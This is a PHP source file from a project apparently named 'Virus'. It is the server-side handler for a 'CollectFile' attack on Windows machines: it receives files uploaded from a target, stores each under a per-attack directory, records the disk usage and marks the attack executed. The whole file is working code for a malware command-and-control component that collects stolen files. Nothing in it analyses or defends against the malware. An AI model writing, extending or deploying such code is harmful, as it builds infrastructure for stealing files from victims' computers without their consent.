<?php

use Kelvinho\Virus\Singleton\Logs;

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectFile\CollectFile $this */

$numberOfFiles = count($this->getFileNames());
$size = 0;
for ($i = 0; $i < $numberOfFiles; $i++) if (!$this->requestData->hasFile("file$i")) Logs::error("Supposed to have file $i");
for ($i = 0; $i < $numberOfFiles; $i++) {
    $fileName = DATA_DIR . "/attacks/$this->attack_id/file$i";
    $this->requestData->moveFile("file$i", $fileName);
    $size += filesize($fileName);
}
$this->usage()->setDisk($size)->saveState();
$this->setExecuted();
